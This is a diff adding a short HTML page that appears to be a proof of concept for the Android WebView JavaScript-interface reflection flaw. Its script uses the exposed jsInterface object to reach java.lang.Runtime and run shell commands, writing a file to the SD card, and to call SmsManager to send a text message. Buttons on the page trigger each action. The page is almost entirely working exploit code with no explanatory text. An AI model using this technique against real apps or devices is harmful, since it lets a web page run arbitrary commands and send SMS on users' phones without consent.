@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <script type="text/javascript">
+        function sendSMS() {
+            var smsManager = window.jsInterface.getClass().forName('android.telephony.SmsManager').getMethod('getDefault', null).invoke(null, null);
+            smsManager.sendTextMessage('133xxxxxxxx', null, 'hello', null, null);
+        }
+
+        function createFile() {
+            execute(['/system/bin/sh','-c','echo \"Hello Android!\" > /mnt/sdcard/test.txt']);
+        }
+
+        function execute(cmd){
+            return window.jsInterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null,null).exec(cmd);
+        }
+    </script>
+    <title></title>
+</head>
+<body>
+    <button onclick="createFile();">Create File</button>
+    <button onclick="sendSMS();">Send SMS</button>
+</body>
+</html>
